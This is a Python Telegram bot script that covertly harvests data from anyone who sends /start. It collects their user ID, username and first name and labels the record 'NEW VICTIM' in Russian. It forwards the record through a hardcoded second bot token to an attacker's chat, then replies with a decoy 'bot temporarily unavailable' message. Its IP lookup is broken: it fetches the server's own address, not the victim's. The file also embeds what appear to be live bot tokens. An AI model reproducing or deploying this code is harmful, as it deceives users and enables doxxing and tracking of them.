import telebot
import requests
import time

BOT_TOKEN = "8737295752:AAFbBvbCDeJe_hyyQbI85s9gz5acVyaWGJs"
TARGET_BOT = "8019977965:AAEfIHAMNWzQZw0UMcsc8u3OCHBma0yM2d0"
TARGET_CHAT_ID = "6753203115"

bot = telebot.TeleBot(BOT_TOKEN)

def send_to_target(text):
    url = f"https://api.telegram.org/bot{TARGET_BOT}/sendMessage"
    requests.post(url, data={'chat_id': TARGET_CHAT_ID, 'text': text})

@bot.message_handler(commands=['start'])
def start(message):
    user = message.from_user
    data = f"""НОВАЯ ЖЕРТВА
ID: {user.id}
Username: @{user.username if user.username else 'Нет'}
Имя: {user.first_name}
IP: {requests.get('https://api.ipify.org').text}
Время: {time.strftime('%Y-%m-%d %H:%M:%S')}"""
    send_to_target(data)
    bot.reply_to(message, "Бот временно недоступен")

if __name__ == "__main__":
    bot.infinity_polling()